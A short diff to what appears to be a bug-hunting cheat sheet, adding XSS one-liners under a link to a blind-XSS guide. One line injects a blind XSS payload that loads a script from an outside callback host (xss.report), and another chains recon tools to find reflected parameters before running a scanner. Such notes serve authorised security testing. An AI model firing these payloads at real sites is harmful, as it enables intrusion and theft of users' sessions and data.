@@ -80,7 +80,13 @@ XSS
 -------------
 https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide
 
+>>example 1
 katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"
+
+>>example 2
+echo target.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/ | sort -u > final.txt
+python loxs.py
 
 SQLi
 -------------
